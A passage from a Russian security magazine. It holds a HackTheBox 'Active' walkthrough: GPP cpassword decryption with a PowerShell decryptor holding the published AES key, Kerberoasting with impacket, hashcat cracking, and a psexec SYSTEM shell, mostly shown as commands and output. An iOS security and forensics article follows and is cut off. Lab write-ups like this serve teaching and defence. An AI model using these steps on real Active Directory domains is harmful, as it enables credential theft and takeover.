  ‐r‐‐r‐‐r‐‐             3722 Sat Jul 21 13:38:11 2018    GptTmpl.inf


И в качестве финального штриха забира ем понравившийся нам файл (спой‐
лер: это Groups.xml), ука зав при этом флаг ‐q, чтобы не смотреть на листинг
лишний раз.



  root@kali:~# smbmap ‐H 10.10.10.100 ‐R Replication ‐A Groups.xml ‐q
  [+] Finding open SMB ports....
  [+] User SMB session establishd on 10.10.10.100...
  [+] IP: 10.10.10.100:445        Name: 10.10.10.100
  Disk                       Permissions
  ‐‐‐‐                       ‐‐‐‐‐‐‐‐‐‐‐
  Replication                READ ONLY
  [+] Starting search for files matching 'Groups.xml' on share Replica‐
  tion.
  [+] Match found! Downloading: Replication\active.htb\Policies\{31B2F340‐
  016D‐11D2‐945F‐00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml



        WWW

                      Вот еще пара разведскрип тов.
                        •enum4linux — классика жанра. Эта написанная
                         на Perl софтина немного устарела, но неп лохо
                        помогает  в  сбо ре информации  о  Windows
                       и Samba.
                            •nullinux.py —  обновлен ная  и  переписанная
                         на Python альтернатива enum4linux. Делает то
                          же,  но  красивее  и  без  кучи  сооб щений
                       об ошиб ках.



GPP (GROUP POLICY PREFERENCES)
Перейдем к просмотру того, что мы смогли вытащить с SMB.
  Средство для управления предпочтениями групповых политик, или Group
Policy Preferences (GPP), было представлено в 2008 году в Windows Server
и упрощает жизнь администраторам домена. С помощью GPP они могут цен‐
трализованно управлять парамет рами безопасности пользователей и групп
по всей своей сети.
  Например, админ обнаружил, что пароль локального администратора
не соответствует политике безопасности, и решил его изме нить. В этом слу‐
чае новый пароль зашифруется ключом AES‐256 и экспортируется в Group‐
s.xml (чтобы не потерять!). Это тот самый файл, который мы захватили вместе
с папкой Replication.
  Однако в 2012 году сотрудники Microsoft по какой‐то при чине решили
открыто опубликовать тот самый ключ шифрования на MSDN, и с тех пор
пароли, установ ленные с помощью GPP, больше не считаются безопасными.
Теперь даже приклеить стикер с таким паролем на монитор кажется меньшим
вандализмом — так к нему хотя бы не дотянуть ся по сети.





  Опубликованный на MSDN ключ AES‐256 для шифрования паролей
  из Groups.xml

И несмотря на вышедший в 2014 году патч, запрещающий хранить пароли
в Groups.xml, в 2019‐м все равно оста ется вероятность наткнуться на ошибки
конфигурации такого рода, и эта машина — как раз наш случай.



  root@kali:~# cat Groups.xml
  <?xml version="1.0" encoding="utf‐8"?>
  <Groups clsid="{3125E937‐EB16‐4b4c‐9934‐544FC6D24D26}"><User clsid="{
  DF5F1855‐51E5‐4d24‐8B1A‐D9BDE98BA1D1}" name="active.htb\SVC_TGS"
  image="2" changed="2018‐07‐18 20:46:06" uid="{EF57DA28‐5F69‐4530‐A59E‐
  AAB58578219D}"><Properties action="U" newName="" fullName="" descrip‐
  tion="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeX‐
  OsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" nev‐
  erExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>User>
  Groups>


Поле  cpassword  содержит  пароль  пользователя  active.htb\SVC_TGS,
зашифрованный клю чом Microsoft... Уже не секретным ключом Microsoft.



                                                                  "]+"|userName="["]+"'  root@kali:~# cat Groups.xml | grep ‐o 'cpassword="[
  cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xU‐
  jTLfCuNH8pG5aSVYdYw/NglVmQ"
  userName="active.htb\SVC_TGS"




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

        УКРОЩЕНИЕ
          KERBEROS
                  ЗАХВАТЫВАЕМ ACTIVE DIRECTORY
           НА ВИРТУАЛЬНОЙ МАШИНЕ С HACKTHEBOX





Дек рипт cpassword
gpp-decrypt
В Kali Linux есть штатная утилита для расшифровки паролей GPP — gpp‐
decrypt.



  root@kali:~# gpp‐decrypt
  'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuN‐
  H8pG5aSVYdYw/NglVmQ'
  /usr/bin/gpp‐decrypt:21: warning: constant OpenSSL::Cipher::Cipher is
  deprecated
  GPPstillStandingStrong2k18



Скрипт на PowerShell
Также есть интересный скрипт для PowerShell, который выполняет ту же
задачу. Полную версию ты можешь найти на GitHub, я же использовал только
нужный кусочек, взятый из коммента риев в блоге автора.


function getpwd([string]$Cpassword) {
  $pl = $Cpassword.length % 4
  if($pl ‐eq 0){$pad = ""}
  else{$Pad = "=" * (4 ‐ ($Cpassword.length % 4))}
  $Base64Decoded = [Convert]::FromBase64String($Cpassword + $Pad)
  # Create a new AES .NET Crypto Object
  $AesObject = New‐Object System.Security.Cryptography.AesCry
ptoServiceProvider
  # Static Key from http://msdn.microsoft.com/en‐us/library/
2c15cbf0‐f086‐4c74‐8b70‐1f2fa45dd4be%28v=PROT.13%29#endNote2
  [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,
0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,
0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
  # Set IV to all nulls (thanks Matt) to prevent dynamic generation
of IV value
  $AesIV = New‐Object Byte[]($AesObject.IV.Length)
  $AesObject.IV = $AesIV
  $AesObject.Key = $AesKey
  $DecryptorObject = $AesObject.CreateDecryptor()
  [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64
Decoded, 0, $Base64Decoded.length)


  return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
}





      Расшифровываем пароль GPP с помощью скрипта на PowerShell

В любом случае мы получили авто риза ционные данные: SVC_TGS:GPPstill‐
StandingStrong2k18.


PrivEsc: Anonymous → SVC_TGS
Получив пользовательский дос туп к SMB, заберем первый флаг из \\10.10.
10.100\Users.



  root@kali:~# smbmap ‐d active.htb ‐u SVC_TGS ‐p GPPstillStand‐
  ingStrong2k18 ‐H 10.10.10.100 ‐R Users ‐A user.txt ‐q
  [+] Finding open SMB ports....
  [+] User SMB session establishd on 10.10.10.100...
  [+] IP: 10.10.10.100:445        Name: 10.10.10.100
  Disk                       Permissions
  ‐‐‐‐                       ‐‐‐‐‐‐‐‐‐‐‐
  Users                      READ ONLY
  [+] Starting search for files matching 'user.txt' on share Users.
  [+] Match found! Downloading: Users\SVC_TGS\Desktop\user.txt



user.txt


  root@kali:~# cat /usr/share/smbmap/10.10.10.100‐Users_SVC_TGS_Desk‐
  top_user.txt
  86d67d8b????????????????????????



Мон тирование SMB
Для более детального изу чения содержимого директорий можно мон‐
тировать SMB‐шару. Для примера возьмем ту же //10.10.10.100/Users.



  root@kali:~# mount ‐t cifs //10.10.10.100/Users /mnt/smb ‐v ‐o
  user=SVC_TGS,pass=GPPstillStandingStrong2k18
  mount.cifs kernel mount options: ip=10.10.10.100,unc=\\10.10.10.100\
  Users,user=SVC_TGS,pass=********
  root@kali:~# ls ‐la /mnt/smb
  total 33
  drwxr‐xr‐x 2 root root 4096 Jul 21 17:39  .
  drwxr‐xr‐x 3 root root 4096 Aug  8 15:54  ..
  drwxr‐xr‐x 2 root root    0 Jul 16 13:14  Administrator
  l‐‐‐‐‐‐‐‐‐ 1 root root    0 Jul 14  2009 'All Users' ‐> '/??/C:/Program‐
  Data'
  drwxr‐xr‐x 2 root root 8192 Jul 14  2009  Default
  drwxr‐xr‐x 2 root root 8192 Jul 14  2009 'Default User'
  ‐rwxr‐xr‐x 1 root root  174 Jul 14  2009  desktop.ini
  drwxr‐xr‐x 2 root root 4096 Jul 14  2009  Public
  drwxr‐xr‐x 2 root root 4096 Jul 21 18:16  SVC_TGS





             Примонтированный SMB‐ресурс в Kali Linux


ПОЛУЧЕНИЕ ПОЛЬЗОВАТЕЛЕЙ AD
Итак, у нас есть аккаунт внутри домена. Можно воспользоваться утилитой
ldapsearch для поиска записей о пользователях домена в службе каталога,
доступной по протоко лу LDAP. Использование фильтра useraccountcon‐
trol:1.2.840.113556.1.4.803:  со  зна чением  2  гарантирует,  что мы
получим информацию только об активных акка унтах AD.



  root@kali:~# ldapsearch ‐x ‐h 10.10.10.100 ‐p 389 ‐D 'SVC_TGS' ‐w 'GPP‐
  stillStandingStrong2k18'‐b "dc=active,dc=htb" ‐s sub"(&
  (objectCategory=person)(objectClass=user)(!
  (useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep
  sAMAccountNamePage
  sAMAccountName: Administrator
  sAMAccountName: SVC_TGS


То же самое можно было получить с помощью коллекции скриптов на Python
impacket.



  root@kali:~# GetADUsers.py ‐all active.htb/SVC_TGS:GPPstillStand‐
  ingStrong2k18 ‐dc‐ip 10.10.10.100
  Impacket v0.9.18‐dev ‐ Copyright 2002‐2018 Core Security Technologies


  [*] Querying 10.10.10.100 for information about domain.
  Name           Email   PasswordLastSet      LastLogon
  ‐‐‐‐‐‐‐‐‐‐‐‐‐  ‐‐‐‐‐‐  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  Administrator          2018‐07‐18 22:06:40  2018‐12‐11 04:20:35
  Guest                  <never>              <never>
  krbtgt                 2018‐07‐18 21:50:36  <never>
  SVC_TGS                2018‐07‐18 23:14:38  2018‐12‐13 23:30:55



KERBEROASTING — ПОРТ 88
Одна из техник повышения привилегий в рамках системы аутентификации
Kerberos называется Kerberoasting (игра слов: Kerberos + roasting = «прожарка
Kerberos»). Она была представлена Тимом Медином на конференции Derby‐
Con в 2014 году (PDF).
  Основная идея атаки: если нужный нам аккаунт (администратор, конечно)
ассоциирован с записью SPN (Service Principal Name), мы можем попросить
у центра распре деле ния ключей системы Kerberos (KDC, Key Distribution Cen‐
ter) на контроллере соответству ющий тикет TGS (Ticket Granting Service),
который будет содержать хеш пароля от этого аккаунта.
   Если пароль слабый, мы легко вос становим его в офлай не. Это возможно
потому, что TGS_REP — ответ Kerberos на такой запрос — будет зашифрован
с помощью хеша NTLM‐пароля того аккаунта, от имени которого запущен
сервис.
  Сетевые взаимодействия при подобной атаке отражены на рисунке ниже.





                Схема выполнения атаки Kerberoasting


        WWW

                      Если любишь такое чти во, то о Kerberoasting
                    можешь почитать в этих статьях.
                         •Kerberoasting Without Mimikatz
                         •Kerberoasting  —   Stealing   Service  Account
                             Credentials



По луче ние SPN пользовате лей AD
Для перечисления (enumeration) принципалов раз вернутых сервисов (SPN)
можно еще воспользоваться поиском по LDAP.



  root@kali:~# ldapsearch ‐x ‐h 10.10.10.100 ‐p 389 ‐D 'SVC_TGS' ‐w'GPP‐
  stillStandingStrong2k18' ‐b "dc=active,dc=htb" ‐s sub"(&
  (objectCategory=person)(objectClass=user)(!
  (useraccountcontrol:1.2.840.113556.1.4.803:=2))
  (serviceprincipalname=/))" serviceprincipalname | grep‐B 1 servicePrin‐
  cipalName
  servicePrincipleName: active/CIFS:445


Или можно при помощи impacket сра зу сдампить хеш TGS найденного акка‐
унта. Для этого есть флаг ‐request.



  root@kali:~# GetUserSPNs.py active.htb/SVC_TGS:GPPstillStand‐
  ingStrong2k18 ‐dc‐ip 10.10.10.100 ‐request ‐output tgs‐administra‐
  tor.hash
  Impacket v0.9.18‐dev ‐ Copyright 2002‐2018 Core Security Technologies


  ServicePrincipalName  Name           MemberOf
  PasswordLastSet      LastLogon
  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐  ‐‐‐‐‐‐‐‐‐‐‐‐‐  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  active/CIFS:445       Administrator  CN=Group Policy Creator Owners,
  CN=Users,DC=active,DC=htb  2018‐07‐18 22:06:40  2018‐12‐11 04:20:35


  root@kali:~# cat tgs‐administrator.hash
  $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*...[хеш‐
  значение]...



Восстановление пароля админа
Восстанавливать прообраз хеша будем с помощью Hashcat. С этой задачей
может справиться и John The Ripper версии Jumbo.
  Для начала заглянем в шпаргалку по режимам Hashcat и выясним, что нуж‐
ный нам режим — 13100. Теперь все готово для восстановления пароля.



  root@kali:~# hashcat ‐a 0 ‐m 13100 tgs‐administrator.hash
  /usr/share/wordlists/rockyou.txt ‐‐force
  root@kali:~# hashcat ‐m 13100 tgs‐administrator.hash ‐‐show
  $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*...[хеш‐
  значение]...:Ticketmaster1968


Успех. Авторизационные данные для привилегированного доступа — Admin‐
istrator:Ticketmaster1968.


PrivEsc: SVC_TGS → Administrator
Можем забрать последний флаг root.txt из домашней директории адми‐
нистратора с помощью smbmap точно так же, как я показал это ранее,
а можем с помощью скрипта psexec.py инициировать суперпользователь‐
скую сессию.



  root@kali:~# psexec.py
  active.htb/Administrator:Ticketmaster1968@10.10.10.100
  Impacket v0.9.18‐dev ‐ Copyright 2002‐2018 Core Security Technologies


  [*] Requesting shares on 10.10.10.100.....
  [*] Found writable share ADMIN$
  [*] Uploading file hPUtqrwN.exe
  [*] Opening SVCManager on 10.10.10.100.....
  [*] Creating service QclS on 10.10.10.100.....
  [*] Starting service QclS.....
  [!] Press help for extra shell commands
  Microsoft Windows [Version 6.1.7601]
  Copyright (c) 2009 Microsoft Corporation. All rights reserved.


  C:\Windows\system32>whoami
  nt authority\system



root.txt


  C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
  b5fc76d1????????????????????????


На этом все, теперь система полностью под нашим контролем.



  C:\Windows\system32>exit
  [*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
  [*] Opening SVCManager on 10.10.10.100.....
  [*] Stopping service QclS.....
  [*] Removing service QclS.....
  [*] Removing file hPUtqrwN.exe.....





                             Трофей


ЗАЩИТА
Что делать, чтобы такого не произошло с твоим настоящим контроллером
домена? К сожалению, вектор, по которому осу ществляется атака Kerberoast‐
ing, использует уязвимость самой архитек туры протокола Kerberos, поэтому
наилучшая мера защиты от атак подоб ного типа — использовать сложные
пароли для служебных учетных записей, свя занных с Kerberos и SPN. Кроме
того, нелишним будет сконфигурировать все сервисы без использования
учетных записей с расширенными привилегиями.
ПРИВАТНОСТЬ



       САМАЯ
 НЕБЕЗОПАСНАЯ
  ОС

            КАК ПОПУЛЯРНОСТЬ IOS
        СТАВИТ ЕЕ ПОЛЬЗОВАТЕЛЕЙ
                  ПОД УГРОЗУ





Мы много писали о безопасности мобиль‐
ной ОС Apple и о том, как отдельные уяз‐
вимости  системы  можно  использовать
для доступа к информации. И в каж дой
такой  статье  звучала  мысль:  несмотря           Олег Афонин                                                                                      Эксперт по мобильной
на  отдельные  недостатки,  iOS  у  Apple       криминалистике«Элкомсофт»компании
получилась  грамотно  спроектированной        aoleg@voicecallcentral.com
и хорошо защищенной ОС. Сегодня мы
перевернем твой мир с ног на голову
утверждением,  что  iOS —  наиме нее
безопасная  из  всех мобильных  систем
на рынке.


Скажу откровенно: мне нравится подход Apple к обес печению безопасности.
Мне известно о слабостях и уязвимостях iOS (они устраняются с каждым
обновлением) и отлично видны слабости архитектуры безопасности, выз‐
ванные желанием компании угодить широкому кру гу потребите лей. Да, Apple
можно было бы пох валить за тщательно продуманный и качес твенно реали‐
зованный подход к безопас ности.
  Можно было бы, если бы не одно «но»: iPhone — самое популярное в мире
устройство. Да, мы помним, что смартфо нов с Android на руках у пользовате‐
лей гораздо больше, но моделей с Android — десятки тысяч, а iPhone — еди‐
ницы. Популярность сыграла с Apple злую шутку: устройствами с iOS стали
заниматься буквально все заинтересо ванные сто роны, не жалея времени
и денег. В результате на сегодняшний день ситу ация сложилась весьма
и весьма интересная: iOS считается безопасной, но заинтересованные сто‐
роны при соблюдении некото рых условий могут получить полный дос туп
к данным.


ФИЗИЧЕСКАЯ БЕЗОПАСНОСТЬ УСТРОЙСТВ IOS
 1. Все современ ные, не очень современные и откровенно устаревшие
   iPhone и iPad применя ют стойкое шифрование накопителя. Любые атаки
  методом извле чения микросхемы памяти заведомо обре чены (это дей‐
   ствительно так; данный вектор атаки стал бес полезен много лет назад).
 2. В iOS предусмотрена (и действительно работа ет) система защиты данных
   в случае кражи или потери устройства. Дос тупны механизмы удаленного
   стирания и блокировки устройства. Укра денное устройство невозможно
   будет разблокировать и перепродать, если зло умышленнику неиз вестны
   пароль на устрой ство (код бло кировки экра на) или пароль от учетной
   записи Apple ID владельца (требуется одно из двух).
 3. Многоуровневое шифрование данных «из коробки» идеально спроекти‐
   ровано и реализовано. Пользователь ские данные зашифрованы всегда —
   за редкими исклю чениями в виде файлов и баз данных, необходимых, что‐
  бы телефон принимал звонки сразу после перезагрузки. В iOS исполь‐
   зуется файловая система APFS. Каж дый файл зашифрован своим ключом,
   который будет уничтожен при удалении фай ла. В результате восстановить
   удаленные файлы ста новится в прин ципе невоз можно. Ключи защищены
   выделенным  сопроцессором,  входящим  в  систему  Secure  Enclave,
   и извлечь их оттуда нельзя даже пос ле взлома устройства. Данные
   при включении телефо на оста ются зашифрованными, пока не будет вве‐
   ден правильный пароль, раз блокиру ющий экран.
 4. Многоуровневое шифрование означает, в час тности, то, что некоторые
   данные (например, пароли к веб‐сай там, ска чанная на устройство элек‐
   тронная почта) допол нительно защищены: они хранятся в виде зашиф‐
   рованных записей в базе данных связ ки ключей iCloud Keychain (которая,
   в свою оче редь, зашифрована при помощи пофайлового шифрования
   вместе с остальными файлами на пользователь ском разделе).
 5. Нельзя просто подклю чить к компьютеру iPhone и скачать с него данные
   (кроме фотографий). В iOS предусмотрена воз можность установления
   доверительных отношений с компь ютерами. При этом создается пара
   криптографических ключей, поз воляющих доверенному компьютеру обме‐
   ниваться  информацией  и  создавать  резервные  копии  устройства.
  Для установления доверитель ных отношений с компьютером iPhone необ‐
   ходимо разблокировать и ввес ти код блокировки.
 6. Дополнительной степенью защиты от подключения к неавторизованному
   компьютеру устрой ства  (начиная с iOS  11.4.1) является блокировка
   передачи данных через USB‐порт сразу после того, как экран телефона
  был выключен, если устройство недавно не подключалось к компьютеру
   или аксессуару. Режим USB Restricted Mode опционален, но включен
   по умолчанию. Кстати, появился этот режим для противодействия перебо‐
   ру паролей решениями GrayKey и Cellebrite.
 7. Безопасность резервных копий обеспечивается возможностью установить
   сложный пароль (пароль требуется исключительно для восстановления
   данных из резервной копии, поэто му в режиме повседневного исполь‐
   зования мешать не будет). Шифрование локальных резервных копий
   исключительно стой кое, перебор паролей — очень медленный. В старых
   версиях iOS эта защита была абсолютной; начиная с iOS 11 этот пароль
  можно сбросить, ука зав код блокировки экрана.
 8. Для  разбло кировки можно  использовать  как  стандартный  PIN‐код
   из четырех или шести цифр, так и более слож ный пароль. Единственный
   дополнительный способ раз блокирования устройства — биометрический
   (отпечаток пальца Touch ID или Face ID). При этом реализация биометрики
   такова, что число попыток будет огра ничено. Данные отпе чатка зашиф‐
   рованы и будут удалены из оперативной памяти устройства после вык‐
   лючения или перезагрузки (а также пос ле входа в режим SOS); через
   некоторое время, если устройство ни разу не разблокировалось; пос ле
   пяти неудачных попыток; через некото рое время, если пользователь
   ни разу не вводил пароль для раз блокировки устройства.

В Apple спроектировали и реализовали дос таточно логичную и всес тороннюю
архитектуру безопасности. Однако физическая безопасность iPhone в нас‐
тоящий момент близка к нулю. Перечислим основные моменты, которые нам
не нравятся.
 1. В Apple придают исклю читель ное значение коду блокировки экрана. Зная
   только и исключительно код блокировки, с устройством и данными поль‐
   зователя можно проделать решительно всё: подключить к новому компь‐
   ютеру, сбросить пароль от резервной копии, сбросить и изменить пароль
   от учетной записи Apple  ID, сменить средства двухфакторной аутен‐
   тификации, отвязать телефон от сервиса Find My iPhone и снять блокиров‐
   ку iCloud. В данном слу чае в Apple сложили все до единого яйца в одну
   корзину; в качестве единственной защиты выступает код блокировки, толь‐
   ко код блокировки и ничего, кроме кода блокировки экрана.
 2. На рынке существует по крайней мере два решения (компаний Cellebrite
   и GrayShift), которые поз воляют подоб рать код блокировки и извлечь дан‐
  ные из iPhone любой модели, работа ющего на акту альной или более ста‐
   рой версии iOS (на момент написания статьи это актуальная версия iOS
   12.3.1). И если для выключенного устрой ства потребу ется перебор кодов
   блокировки (он медленный, до десяти минут на попытку, что дает мак‐
   симальный срок перебо ра девятнадцать лет для все го прос транства шес‐
   тизначных цифровых паролей), то для устройств, которые были разбло‐
   кированы хотя бы раз пос ле загрузки (а это боль шая часть устройств, кон‐
   фискованных полицией), данные извлекаются сразу, а перебор паролей
   очень быстрый (приблизитель но за 20–30 минут перебирается все прос‐
   транство паролей из четырех цифр). После раз блокировки из телефона
   извлекается абсолютно  вся информа ция  вплоть до зашифрованных
   записей из связки ключей (а это все сохраненные пароли пользователя
   из браузера Safari и сторонних приложений).
 3. Устройства и услуги по взлому паролей и извлечению данных из заб‐
   локированных iPhone дос тупны исключительно государс твенным и пра‐
   воохранительным органам, причем далеко не для каждой страны. К при‐
   меру, в США, Канаде, Израиле, странах Европы эти решения правоох‐
   ранительным органам дос тупны, а в Рос сии и Китае — нет.





Результат интересный и неоднозначный: мощ ная, всесторонне продуманная
архитектура безопасности соседс тву ет с ущербной физической безопас‐
ностью. Данные могут быть извлечены из любого iPhone, вопрос лишь в дос‐
тупности спецсредств и состоянии устройства (получе но в лаборатории
в выключенном виде или же было раз блокировано пользовате лем хотя бы раз
с момента включения). В Apple прекрасно осведомлены о решениях Cellebrite
и GrayShift и попытались противодейство вать им, добавив режим USB Re‐
stricted Mode, отключающий переда чу данных через USB сразу после бло‐
кировки экрана устройства. Но он не стал принципиальным препятствием
для взлома iPhone.
  Разумеется, все может измениться с выходом iOS 13, а новое аппаратное
обеспечение (11‐е поколение iPhone) наверняка сделает невоз можным
используемые в настоящий момент подходы. Рас пространение спецсредств
для взлома паролей и извлечения данных из iPhone тщательно контролиру‐
ется компаниями — разработчиками Cellebrite и GrayShift, работающими
исключительно с правоохранительными орга нами избранных государств,
в число которых Россия не входит. А пока сделаем осторожный вывод: можно
продолжать пользоваться устройства ми Apple, которые надежно защищают
данные от злоумышленников — но не от полиции и спецслужб США, Канады,
стран ЕС или Израиля.


ОБЛАЧНАЯ БЕЗОПАСНОСТЬ IOS
С вопросом физической безопасности устройств с iOS мы разобрались.
А как обстоят дела со слежкой за пользователем и с утечками данных?
  В iOS есть отключаемая синхрониза ция с облаком через собственный
сервис Apple iCloud. В час тнос ти, в iCloud могут сохраняться:
 1. Резервные копии устройства (фактически используется дос таточно редко
   из‐за чрезвычайной скупости Apple, выделяющей пользователям не самых
  дешевых смартфонов всего 5 Гбайт свободного места в облаке iCloud).
 2. Синхронизированные данные — журнал звонков, заметки, календари, поч‐
    та.
 3. Синхронизированные данные с дополнительным шиф рованием (для дос‐
   тупа требуется как логин и пароль от Apple ID, так и второй фактор аутен‐
   тификации и — обязательно! — код блокировки устройства). Сюда
   попадают пароли из облачной связ ки ключей iCloud Keychain, данные
   «Здоровья», сооб щения в iCloud (SMS, iMessage). Обрати внимание: дан‐
  ные из этого списка не будут выданы компанией Apple по запросу пра‐
   воохранительных органов.
 4. Открытые вкладки (без огра ничения по времени; лишь в iOS 13 появится
   режим, ограничивающий время жиз ни открытых вкладок) и история
  посеще ния ресурсов в браузере Safari за последние 30 дней.
 5. Фотографии и видео, если включена облачная биб лиотека iCloud Photos.
 6. Данные приложе ний, разработчики которых исполь зуют iCloud Drive.





Все виды облачной синхрониза ции пользователь iOS может отключить, вык‐
лючив iCloud и деактивировав iCloud Drive. После этого данные не будут
передаваться на серверы Apple. Нес мотря на то что некоторые механиз мы
работают не слишком интуитивно (как пример — для выключения синхрониза‐
ции звонков нужно отключать iCloud Drive, предназначенный для синхрониза‐
ции файлов и фотографий), полное выключение облачных сервисов синхро‐
низацию полностью отключает.
  В iOS предусмотрен механизм для предот вра щения отслеживания устрой‐
ств (система может представлять внешнему миру случайные идентификаторы
модулей Wi‐Fi и Bluetooth вмес то фиксированных нас тоящих).
  Насколько безопасно хранить данные в iCloud? Здесь нужно отметить, что
Apple использует для хра нения пользовательских данных сторонние сервисы
(Microsoft, Amazon, Google, AT&T, а также серверы, контролируемые пра‐
вительством Китая). Означает ли это, что Microsoft, Amazon и далее по списку
могут получить доступ к этим данным? Нет: все данные раз биты на блоки,
а каждый блок зашифрован собственным уникальным ключом, который
физически хранится на серверах Apple в Купертино. Соответс твенно, просто
получить доступ к блокам на сервере Amazon или Google недостаточно —
нужно еще и извлечь ключи шифрования, которые хранятся совсем в другом
месте. В то же время доступ к этим ключам может получить как сама ком‐
пания Apple, так и третьи лица, которые смогли зайти в учетную запись поль‐
зователя.
  В зависимости от того, кто пытается получить данные и что ему известно
о пользователе, можно сформулировать следующие правила.
  Для резервных копий iCloud Backups, фотографий, а также всех видов син‐
хронизированных данных, за исключением категории «Синхронизированные
данные с дополнительным шифрованием»: для доступа достаточно знать
логин и пароль поль зователя. Если учетная запись защищена по методу двух‐
факторной аутентификации, также необходим доступ ко второму фактору (это
требование можно обойти, если подключать ся к синхронизи рованным дан‐
ным с компьюте ра поль зователя, где установлено при ложе ние iCloud). Пра‐
воохранительные органы  могут  получить  эти данные, отправив запрос
в Apple. Запрос дол жен сопровождать ся соответству ющим постановлением
суда (для Китая действу ют упрощенные пра вила, когда достаточно просто
требования полиции).
  Для категории «Синхронизированные данные с допол нительным шиф‐
рованием» (пароли из облачной связки ключей, данные «Здоровья», сооб‐
щения SMS/iMessage, синхронизированные в обла ко): доступа к этим данным
нет ни у полиции, ни у самой компании Apple. Эти данные не будут предос‐
тавлены по запросу пра воохранительных органов. Тем не менее доступ к ним
получить все‐таки можно, если доступен полный набор из сле дующих фак‐
торов: логин и пароль к Apple ID; второй фактор аутентификации (к при меру,
SIM‐карта с доверенным телефонным номером или одно из устрой ств поль‐
зователя, привязанных к той же учетной записи, в разблокированном виде);
код блокиров ки экрана (iPhone, iPad, iPod Touch) или сис темный пароль (Mac)
одного из устрой ств пользователя, привязанных к той же учетной записи
Apple.


АНАЛИЗ МОДЕЛИ БЕЗОПАСНОСТИ APPLE НА ПРИМЕРЕ
КАТЕГОРИИ «СООБЩЕНИЯ»
Рассмотрим модель безопасности Apple немного подробнее, взяв для при‐
мера такую категорию данных, как сообщения (Messages).
  С момента появления сообщения iMessage были для Apple одной из клю‐
чевых возможностей iOS. Сквозное шифрование, отсутс твие облачной син‐
хронизации, исключительно локальный дос туп долгое вре мя оставались отли‐
чительными чертами системы. В современных версиях iOS сообщения, вклю‐
чая iMessage, могут быть синхро низирова ны с облаком.
  Физическая безопасность сообщений обеспечивается теми же механиз‐
мами, что и безопасность основного массива данных в iPhone. Сообщения
в самом iPhone хранятся в обычной базе данных без допол нительного шиф‐
рования. Точнее говоря, Apple полага ется на шифрование средс твами фай‐
ловой системы и толь ко на него. Учитывая опи санные ранее методы взлома
кода блокировки и извлечения данных, можно сказать, что для всех моделей
iPhone и всех актуальных версий iOS существу ют методы, позволяющие рано
или поздно получить дос туп к сооб щениям, если на руках у эксперта находит‐
ся iPhone пользователя.
  В отличие от Android, iOS ни при каких обстоятельствах не предос тавля ет
доступа к сообщениям никаким сторонним при ложениям. Соответственно,
никакое зловредное ПО не сможет про читать или перехватить сообщения.
  В iOS предусмотрен механизм резервно го копирования. Пользователь
может создать резервную копию своего iPhone на компьюте ре, восполь‐
зовавшись  приложением  Apple  iTunes.  Резервная  копия  может  быть
как защищена паролем, так и не защищена. Если у эксперта есть доступ
к такой резервной копии (или он может создать резервную копию, восполь‐
зовавшись, к примеру, записью lockdown, извлеченной из компьютера поль‐
зователя), то возможность доступа к сооб щени ям лежит лишь в плоскости
расшифровки резервной копии. Напомним: неиз вестный эксперту пароль,
если он был установлен, может быть сброшен на самом iPhone (для этого
нужно знать код блокировки устройства) или вос ста новлен дос таточно мед‐
ленной атакой (результат не гарантирован).
  Синхронизация сооб щений появилась в iOS относительно недавно, одна‐
ко в облако сообщения попадали и раньше. Если в iCloud есть резервная
копия устройства, то в ней могут присутство вать и сооб щения (если поль‐
зователь не вклю чил режим облачных сообщений; об этом ниже). О защите
резервных копий в обла ке мы уже рас ска зали: зашифрованные блоки,
которые хранятся на серверах сторонних компаний, и ключи шифрования,
которые лежат на серверах Apple. Если известны логин и пароль от облака (и
есть доступ ко второму фактору аутентификации), то резервная копия
успешно скачивается, а сооб щения из нее извлекаются.
  Наконец, пользователь может включить режим облачных сообщений.





Он доступен только для учетных записей с двухфакторной аутентификацией.
Теперь все сообщения в облаке будут дополнительно зашифрованы пос‐
редством ключа шифрования из облачной связки ключей, которая, в свою
очередь, зашифрована клю чом, перешифрованным на основе кода бло‐
кировки экрана или системного пароля одного из уже зарегистрированных
в учетной записи устройств. Теперь сооб щения в облаке становятся недос‐
тупными как самой ком пании Apple, так и правоохранительным органам: они
не будут выданы по запросу.
  Отдельно отметим, что при вклю чении режима облачной синхронизации
сообщений в резервную копию они больше не попадают (то же относится и к
фотографиям). Тем не менее если в рас поряжении эксперта есть логин
и пароль от Apple ID и вто рой фактор аутентификации, а также известен код
блокировки iPhone или системный пароль к компьютеру Mac пользователя, то
сообщения можно успешно извлечь из облака при помощи Elcomsoft Phone
Breaker.


IOS И ЗЛОВРЕДНОЕ ПРОГРАММНОЕ ОБЕСПЕЧЕНИЕ
Немаловажный фактор, влияющий на общую безопас ность экосистемы, —
